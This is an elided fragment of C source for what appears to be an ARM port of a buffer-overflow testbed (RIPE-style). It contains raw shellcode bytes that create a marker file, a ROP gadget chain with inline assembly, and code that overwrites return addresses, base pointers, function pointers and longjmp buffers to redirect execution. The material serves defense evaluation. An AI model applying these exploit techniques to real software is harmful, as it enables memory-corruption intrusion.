...
/*modification:
1. createfile shellcode
2. rop gadget
3. overflow-ptr to shellcode directly but not the copied shellcode in buffer
4. changed the defination of frame address. now it is from sp+the offset found in assembly. 
*/
...
"\x01\x60\x8f\xe2\x16\xff\x2f\xe1\x78\x46\x10\x30\xff\x21\xff\x31" 
"\x01\x31\x08\x27\x01\xdf\x40\x40\x01\x27\x01\xdf/tmp/rip-eval/f_xxxx\0";
...
static int rop_sled[3] = {&gadget1 + 55,&cf_ret_param,&exit};
...
#define OLD_BP_PTR (real_frame_addr+3*sizeof(long))
#define RET_ADDR_PTR (real_frame_addr+4*sizeof(long))
#define FRAME_ADDR_OFFSET 0x34800+0xcc//check with the assembly
...
void perform_attack(FILE *output_stream,
 ...
 // char stack_buffer2[1];
  ...
  printf("sp is %x\n", sp);
  char *real_frame_addr=sp+FRAME_ADDR_OFFSET;
  printf("first 64 bytes from frame addr:\n");
  for(count=0;count<64;count++)
  printf("%x,",real_frame_addr[count]);
  printf("\n");
  printf("now, OLD_BP_PTR is: %x, data on it is %x\n",OLD_BP_PTR,*OLD_BP_PTR);
  printf("now, RET_ADDR_PTR is: %x, data on it is %x\n",RET_ADDR_PTR,*RET_ADDR_PTR);
  /***************************************/
  ...
  case DIRECT:
    ...
    case RET_ADDR:
      ...
      fprintf(stderr,"buffer %x, target %x\n",buffer,target_addr);
      break;
    case OLD_BASE_PTR:
  ...
  fprintf(stderr,"original correct return frame addr: %x, return addr: %x\n",payload.ptr_to_correct_return_addr,*payload.ptr_to_correct_return_addr);
  // Set longjmp buffers
  switch(attack.code_ptr) {
  case LONGJMP_BUF_STACK_VAR:
  ...
  case DIRECT:
    ...
    case CREATE_FILE:
      ...
      payload.overflow_ptr = createfile_shellcode;
      break;
    ...
    printf("data at overflow ptr:\n");
	char temp_rop_buffer[40];
	memcpy(temp_rop_buffer,payload.overflow_ptr,40);
	for(count=0;count<40;count++){
		printf("%x,",temp_rop_buffer[count]);
	}
	printf("\n");
    break;
  case INDIRECT:
  ...
  for(count=0;count<payload.size;count++)
  fprintf(stderr, "%d->%x, ",count,payload.buffer[count]);
  fprintf(stderr, "\n");
  ...
  case STRUCT_FUNC_PTR_HEAP:
	...
	break;
  case STRUCT_FUNC_PTR_DATA:
    //data_struct.func_ptr=createfile_shellcode;
    fprintf(stderr,"final %x,%x\n",data_struct.buffer,data_struct.func_ptr);
    for(count=0;count<256;count++)
    fprintf(stderr, "%d->%x, ",count,data_struct.buffer[count]);
    fprintf(stderr, "\n");
...
void gadget1(int a, int b){
   ...
   asm("movs r7, #1");
   asm("svc 1");
   asm(".word 0x706d742f");// /tmp
   asm(".word 0x7069722f");// /rip
   asm(".word 0x6176652d");// -eva
   asm(".word 0x5f662f6c");// l/f_
   asm(".word 0x78787878");// xxxx
   return;
